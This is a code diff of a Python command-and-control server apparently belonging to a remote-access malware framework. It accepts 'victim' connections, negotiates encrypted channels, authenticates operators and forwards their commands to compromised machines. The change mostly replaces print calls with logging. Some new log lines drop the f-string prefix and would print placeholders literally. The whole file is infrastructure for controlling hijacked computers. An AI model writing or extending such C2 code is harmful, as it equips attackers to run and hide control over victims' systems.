@@ -8,6 +8,7 @@ import uuid
 from datetime import datetime
 import importlib.util
 import argparse
+import logging
 
 from lib.C2P import C2P
 from lib.Client import Client
@@ -20,7 +21,11 @@ from lib.EZPayload import get_payload
 import lib.c2login as c2login
 
 class Listener:
-    def __init__(self, ip: str, port: int, args: argparse):
+    def __init__(self, ip: str, port: int, args: argparse.Namespace):
+        self.args = args
+        self.log = logging.getLogger(self.__class__.__name__)
+        self.log.setLevel(logging.NOTSET)
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((ip, port))
@@ -39,11 +44,11 @@ class Listener:
 
     def start(self):
         self.sock.listen(100)
-        cp.pf_info(f'listening: {self.sock.getsockname()[1]}')
-
+        self.log.debug(f'listening: {self.sock.getsockname()[1]}')
+        
         while True:
             conn, addr = self.sock.accept()
-            cp.pf_info(f'New client: ({addr[0]},{addr[1]})')
+            self.log.debug(f'New client: ({addr[0]},{addr[1]})')
             threading.Thread(target=self.handler, args=[conn, addr, ]).start()
 
     def stop(self):
@@ -66,7 +71,7 @@ class Listener:
         ls_output = DB().sql_execute(sql_query)
 
         if len(ls_output) == 0:
-            cp.pf_err('sql_execute() error, query: ' + sql_query)
+            self.log.error('sql_execute() error, query: ' + sql_query)
             return
         
         ls_row = ls_output[0]
@@ -85,7 +90,7 @@ class Listener:
         objListener.set_msg_handler(c2victim.msg_handler)
         self.dic_listener[szName] = EZClass.Listener(szName, szTemplate, szIP, nPort, objListener)
 
-        cp.pf_info(f'Listener: {szName}, Port: {nPort}')
+        self.log.debug(f'Listener: {szName}, Port: {nPort}')
 
         objListener.start()
 
@@ -128,7 +133,9 @@ class Listener:
                 abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                 nRecvLength = len(abStaticRecv)
 
-                abDynamicRecv = self.combine_bytes(abDynamicRecv, 0, len(abDynamicRecv), abStaticRecv, 0, nRecvLength)
+                #abDynamicRecv = self.combine_bytes(abDynamicRecv, 0, len(abDynamicRecv), abStaticRecv, 0, nRecvLength)
+
+                abDynamicRecv += abStaticRecv[0:nRecvLength]
                 
                 if not nRecvLength:
                     break
@@ -153,42 +160,34 @@ class Listener:
                         if nCmd == 0:
                             if nParam == 0:
                                 clnt.close()
-                                cp.pf_info('Socket is closed.', clnt.addr)
+                                self.log.debug(f'Socket is closed: {clnt.addr}')
                             elif nParam == 1:
                                 time.sleep(1)
-                                '''
-                                if clnt.dtLastLattency == None:
-                                    clnt.dtLastLattency = datetime.now()
-                                else:
-                                    dtDelta = datetime.now() - clnt.dtLastLattency
-                                    clnt.nLattency = dtDelta.total_seconds() * 1000
-                                    clnt.dtLastLattency = datetime.now()
-                            
-                                '''
+
                                 clnt.send(0, 1, C2P.random_str())
                         elif nCmd == 1:
                             if nParam == 0:
-                                cp.pf_info('Server is notified to do key exchange.', clnt.addr)
+                                self.log.debug(f'Server is notified to do key exchange: {clnt.addr}')
 
                                 n_rsa_keysize = 4096
                                 n, e, d, p, q = EZRSA(n_rsa_keysize).generate_rsa_keypair(n_rsa_keysize)
                                 xml_PubKey = EZRSA(n_rsa_keysize).encode_public_key(n, e)
                                 xml_PrivKey = EZRSA(n_rsa_keysize).encode_private_key(n, e, d, p, q)
 
-                                cp.pf_ok('RSA key pair is generated.', clnt.addr)
+                                self.log.debug('RSA key pair is generated: {clnt.addr}')
 
                                 clnt.xml_rsa_pubKey = xml_PubKey
                                 clnt.xml_rsa_privKey = xml_PrivKey
 
                                 clnt.send(1, 1, Encoder.stre2b64(xml_PubKey))
 
-                                cp.pf_info('Sent RSA public key.', clnt.addr)
+                                self.log.debug(f'Sent RSA public key: {clnt.addr}')
                             elif nParam == 2:
                                 szMsg = abMsg.decode('utf-8')
                                 split = Encoder.b64d2str(szMsg).split('|')
 
                                 if len(split) == 2:
-                                    cp.pf_info('Received encrypted AES key and initial vector', clnt.addr)
+                                    self.log.debug(f'Received encrypted AES key and initial vector: {clnt.addr}')
 
                                     sz_b64_enc_iv = split[0]
                                     sz_b64_enc_key = split[1]
@@ -203,35 +202,33 @@ class Listener:
 
                                     clnt.set_aes(PAES(ab_iv, ab_key))
                                     
-                                    cp.pf_ok('RSA Decrypt successfully, the server obtain both AES key and IV.', clnt.addr)
+                                    self.log.debug('RSA Decrypt successfully, the server obtain both AES key and IV: {clnt.addr}')
 
                                     # Do challenge and response for vertification.
-                                    cp.pf_info('Do challenge and response for vertification...', clnt.addr)
-
+                                    self.log.debug(f'Do challenge and response for vertification..: {clnt.addr}')
+                                    
                                     clnt.szChallenge = C2P.random_str(100)
                                     threading.Thread(target=lambda: clnt.send(1, 3, clnt.szChallenge)).start()
                                 else:
-                                    cp.pf_err('Invalid received abMsg.', clnt.addr)
-                                    cp.pf_info('Restart key exchange...', clnt.addr)
+                                    self.log.error('Invalid received abMsg: {clnt.addr}')
+                                    self.log.debug(f'Restart key exchange..: {clnt.addr}')
 
                                     clnt.send(1, 0, C2P.random_str())
                             elif nParam == 4:
-                                cp.pf_info('Trying vertification...', clnt.addr)
+                                self.log.debug(f'Trying vertification..: {clnt.addr}')
 
                                 szCipherResp = abMsg.decode('utf-8')
                                 ab_enc_resp = Encoder.b64str2bytes(szCipherResp)
                                 szPlainResp = clnt.pAES.decrypt_cbc(ab_enc_resp).decode('utf-8')
 
                                 if szPlainResp == clnt.szChallenge:
-                                    cp.pf_ok('Vertification successed.', clnt.addr)
+                                    self.log.debug('Vertification successed: {clnt.addr}')
 
                                     clnt.sendcommand(1, 5)
                                 else:
-                                    cp.pf_err('Vertification failed.', clnt.addr)
+                                    self.log.error('Vertification failed: {clnt.addr}')
                         elif nCmd == 3: # C2 User
-                            abMsg = Encoder.b64str2bytes(abMsg.decode('utf-8'))
-                            print(clnt.pAES.decrypt_cbc(abMsg))
-                            szDecMsg = clnt.pAES.decrypt_cbc(abMsg).decode()
+                            szDecMsg = clnt.pAES.decrypt_cbc(abMsg).decode('utf-8')
                             aMsg = szDecMsg.split('|')
 
                             # check login
@@ -252,7 +249,7 @@ class Listener:
 
                                     self.dic_user[user] = clnt
                                     self.dic_token[str_uuid] = user
-                                    cp.pf_ok(f'New user login: {user}')
+                                    self.log.debug(f'New user login: {user}')
 
                                     clnt.sendcipher(3, 2, user)
                                 else:
@@ -269,21 +266,22 @@ class Listener:
                                     ls_victim = self.get_victims()
                                     for obj_dic in ls_victim:
                                         if szVictimID in obj_dic.keys():
-                                            c2victim.clnt_msg_handler(self, szUsername, obj_dic[szVictimID], aMsg[3:])
+                                            #c2victim.clnt_msg_handler(self, szUsername, obj_dic[szVictimID], aMsg[3:])
+                                            threading.Thread(target=c2victim.clnt_msg_handler, args=[self, szUsername, obj_dic[szVictimID], aMsg[3:]]).start()
 
             if clnt.username:
                 self.dic_user.pop(clnt.username)
                 self.dic_token.pop(clnt.szUUID)
-                cp.pf_info(f'User offline: {clnt.username}')
+                self.log.debug(f'User offline: {clnt.username}')
         except Exception as ex:
-            cp.pf_err(ex)
+            self.log.error(ex)
             self.dic_user.pop(clnt.username)
             self.dic_token.pop(clnt.szUUID)
             #raise ex
     
     def boardcast_clnt(self, aMsg: list):
         if len(self.dic_user.keys()) == 0:
-            #cp.pf_err('No user is login.')
+            #self.log.error('No user is login.')
             return
 
         for szToken in self.dic_token.keys():
@@ -296,12 +294,12 @@ class Listener:
             return
         
         if szToken not in self.dic_token.keys():
-            cp.pf_err(f'Token \'{szToken}\' not found.')
+            self.log.error(f'Token \'{szToken}\' not found.')
 
         szUsername = self.dic_token[szToken]
 
         if szUsername not in self.dic_user.keys():
-            cp.pf_err(f'User \'{szUsername}\' does not login in')
+            self.log.error(f'User \'{szUsername}\' does not login in')
             return False
         
         try:
@@ -310,7 +308,7 @@ class Listener:
 
             return True
         except Exception as ex:
-            cp.pf_err(ex)
+            self.log.error(ex)
             return False
 
 class c2user:
@@ -414,7 +412,7 @@ class c2user:
         module_name = 'Listener'
 
         if not os.path.exists(module_path):
-            cp.pf_err(f'Template not exists: ' + module_path)
+            self.log.error(f'Template not exists: ' + module_path)
             return None
         
         spec = importlib.util.spec_from_file_location(module_name, module_path)
